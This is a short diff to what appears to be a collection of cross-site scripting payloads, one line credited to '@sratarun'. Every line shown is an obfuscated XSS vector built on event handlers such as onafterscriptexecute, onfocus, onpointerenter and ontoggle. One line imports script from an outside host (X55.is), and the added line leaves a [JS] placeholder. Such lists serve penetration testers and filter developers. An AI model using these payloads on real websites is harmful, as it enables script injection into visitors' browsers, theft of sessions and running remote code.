@@ -11,3 +11,4 @@
 tarun"><x/onafterscriptexecute=confirm%26lpar;)// -@sratarun
 <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
 %22%3EEnter_Mouse_Pointer_Here_to_get_XSS%3C%5K/onpointerenter​=alert(location)%3E%3!–
+<details/open/id="&quote;"ontoggle=[JS]>
